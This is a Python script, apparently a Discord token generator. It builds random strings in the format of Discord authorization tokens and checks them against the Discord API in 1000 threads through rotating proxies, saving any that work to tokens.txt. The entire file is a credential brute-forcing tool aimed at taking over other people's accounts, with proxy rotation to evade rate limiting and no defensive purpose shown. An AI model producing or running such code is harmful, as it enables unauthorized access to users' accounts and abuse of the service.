import base64, random, string, requests, sys, os, threading


class Gen:
    def __init__(self, threads):
        self.proxies = open('proxies.txt', 'r').read().splitlines()
        self.threads = threads
        self.hits    = 0
        self.fails   = 0
    
    def start(self):
        while True:
            if threading.active_count() < self.threads:
                threading.Thread(target=self.check_tucan).start()

    def title(self):
        while True:
            os.system(f'title DC Tucan Gen ^| Hits: {self.hits} ^| Fails: {self.fails}')

    def tucan(self):
        encrypted_id        = base64.b64encode(str(random.randint(000000000000000000, 999999999999999999)).encode()).decode().replace("=", "")
        encrypted_timestamp = random.choice(string.ascii_letters).upper()+"".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP0123456789", k=5))
        hmac                = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP0123456789", k=27))

        return f'{encrypted_id}.{encrypted_timestamp}.{hmac}'

    def check_tucan(self):
        tucan = self.tucan()
        proxy = random.choice(self.proxies)
        
        try:
            req = requests.get(
                url = f'https://discordapp.com/api/v6/users/@me/library',
                headers = {
                    "Content-Type": "application/json",
                    "authorization": tucan
                },
                proxies = {
                    'https': f"http://{proxy}",
                    'http' : f"http://{proxy}"
                }
            )
            
            if req.status_code == 200:
                with open('tokens.txt', 'a') as _:
                    _.write(f'{tucan}\n')
            else:
                sys.stdout.write(f' [x] Invalid Token: {tucan}')
                sys.stdout.flush()

        except:
            pass
        
if __name__ == '__main__':
    gen = Gen(
        threads = 1000
    )
    gen.start()
